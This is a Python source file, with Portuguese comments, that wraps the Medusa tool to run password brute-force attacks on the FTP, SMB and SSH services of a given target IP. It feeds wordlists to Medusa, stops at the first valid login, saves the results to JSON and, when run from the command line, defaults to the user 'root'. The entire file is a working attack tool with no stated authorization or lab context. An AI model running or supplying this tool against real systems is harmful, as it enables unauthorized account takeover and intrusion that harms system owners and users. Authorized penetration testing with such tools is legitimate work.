"""
brute_force.py - Wrapper para Medusa

Realiza ataques de força bruta contra FTP, SMB e outros serviços.
"""

import json
import logging
import subprocess
from typing import Dict, List, Optional
from pathlib import Path
from datetime import datetime

logger = logging.getLogger(__name__)


class BruteForceAttack:
    """Wrapper para automizar ataques de força bruta com Medusa."""

    def __init__(self, target: str, output_dir: Path = None):
        """
        Inicializa o atacante.

        Args:
            target: IP do alvo
            output_dir: Diretório para salvar resultados
        """
        self.target = target
        self.output_dir = output_dir or Path("./results")
        self.output_dir.mkdir(exist_ok=True)
        self.results = {}

    def ftp_brute_force(
        self,
        username: str,
        password_file: str,
        threads: int = 4
    ) -> Dict:
        """
        Ataque de força bruta contra FTP.

        Args:
            username: Usuário para testar
            password_file: Arquivo com senhas
            threads: Número de threads paralelos

        Returns:
            Dict com resultados
        """
        logger.info(f"Iniciando FTP brute force em {self.target}")

        cmd = [
            "medusa",
            "-h", self.target,
            "-u", username,
            "-P", password_file,
            "-M", "ftp",
            "-t", str(threads),
            "-f",  # Parar ao encontrar válida
            "-o", str(self.output_dir / "ftp_results.txt")
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            output = result.stdout + result.stderr
            attack_result = {
                "timestamp": datetime.now().isoformat(),
                "target": self.target,
                "service": "ftp",
                "username": username,
                "password_file": password_file,
                "output": output,
                "success": "SUCCESS" in output or "SUCCESS" in result.stderr
            }

            self.results["ftp"] = attack_result
            self._save_results("ftp")

            return attack_result

        except FileNotFoundError:
            logger.error("Medusa não encontrado. Instale: apt-get install medusa")
            return {"status": "error", "message": "Medusa não instalado"}
        except Exception as e:
            logger.error(f"FTP attack error: {str(e)}")
            return {"status": "error", "message": str(e)}

    def smb_brute_force(
        self,
        username_file: str,
        password_file: str,
        threads: int = 4
    ) -> Dict:
        """
        Ataque de força bruta contra SMB.

        Args:
            username_file: Arquivo com usuários
            password_file: Arquivo com senhas
            threads: Número de threads

        Returns:
            Dict com resultados
        """
        logger.info(f"Iniciando SMB brute force em {self.target}")

        cmd = [
            "medusa",
            "-h", self.target,
            "-U", username_file,
            "-P", password_file,
            "-M", "smbnt",
            "-t", str(threads),
            "-f",
            "-o", str(self.output_dir / "smb_results.txt")
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            output = result.stdout + result.stderr
            attack_result = {
                "timestamp": datetime.now().isoformat(),
                "target": self.target,
                "service": "smb",
                "username_file": username_file,
                "password_file": password_file,
                "output": output,
                "success": "SUCCESS" in output or "SUCCESS" in result.stderr
            }

            self.results["smb"] = attack_result
            self._save_results("smb")

            return attack_result

        except Exception as e:
            logger.error(f"SMB attack error: {str(e)}")
            return {"status": "error", "message": str(e)}

    def ssh_brute_force(
        self,
        username: str,
        password_file: str,
        port: int = 22,
        threads: int = 4
    ) -> Dict:
        """
        Ataque de força bruta contra SSH.

        Args:
            username: Usuário para testar
            password_file: Arquivo com senhas
            port: Porta SSH
            threads: Número de threads

        Returns:
            Dict com resultados
        """
        logger.info(f"Iniciando SSH brute force em {self.target}:{port}")

        cmd = [
            "medusa",
            "-h", self.target,
            "-u", username,
            "-P", password_file,
            "-M", "ssh",
            "-p", str(port),
            "-t", str(threads),
            "-f",
            "-o", str(self.output_dir / "ssh_results.txt")
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            output = result.stdout + result.stderr
            attack_result = {
                "timestamp": datetime.now().isoformat(),
                "target": self.target,
                "port": port,
                "service": "ssh",
                "username": username,
                "password_file": password_file,
                "output": output,
                "success": "SUCCESS" in output or "SUCCESS" in result.stderr
            }

            self.results["ssh"] = attack_result
            self._save_results("ssh")

            return attack_result

        except Exception as e:
            logger.error(f"SSH attack error: {str(e)}")
            return {"status": "error", "message": str(e)}

    def _save_results(self, service: str):
        """Salva resultados em JSON."""
        output_file = self.output_dir / f"{service}_attack_results.json"

        try:
            with open(output_file, "w") as f:
                json.dump(self.results[service], f, indent=2)
            logger.info(f"Resultados salvos em {output_file}")
        except Exception as e:
            logger.error(f"Erro ao salvar resultados: {str(e)}")

    def get_summary(self) -> Dict:
        """Retorna resumo dos ataques realizados."""
        summary = {
            "target": self.target,
            "attacks": [],
            "timestamp": datetime.now().isoformat()
        }

        for service, result in self.results.items():
            summary["attacks"].append({
                "service": service,
                "success": result.get("success", False),
                "timestamp": result.get("timestamp")
            })

        return summary


def main():
    """Teste do brute force."""
    import sys

    if len(sys.argv) < 3:
        print("Uso: python brute_force.py <target_ip> <service> [username] [password_file]")
        print("Services: ftp, smb, ssh")
        sys.exit(1)

    target = sys.argv[1]
    service = sys.argv[2]

    attack = BruteForceAttack(target)

    if service == "ftp":
        username = sys.argv[3] if len(sys.argv) > 3 else "root"
        password_file = sys.argv[4] if len(sys.argv) > 4 else "./wordlists/ftp_passwords.txt"
        result = attack.ftp_brute_force(username, password_file)

    elif service == "smb":
        username_file = sys.argv[3] if len(sys.argv) > 3 else "./wordlists/ftp_users.txt"
        password_file = sys.argv[4] if len(sys.argv) > 4 else "./wordlists/ftp_passwords.txt"
        result = attack.smb_brute_force(username_file, password_file)

    elif service == "ssh":
        username = sys.argv[3] if len(sys.argv) > 3 else "root"
        password_file = sys.argv[4] if len(sys.argv) > 4 else "./wordlists/ftp_passwords.txt"
        result = attack.ssh_brute_force(username, password_file)

    else:
        print("Serviço inválido")
        sys.exit(1)

    print(json.dumps(result, indent=2))
    print(json.dumps(attack.get_summary(), indent=2))


if __name__ == "__main__":
    main()
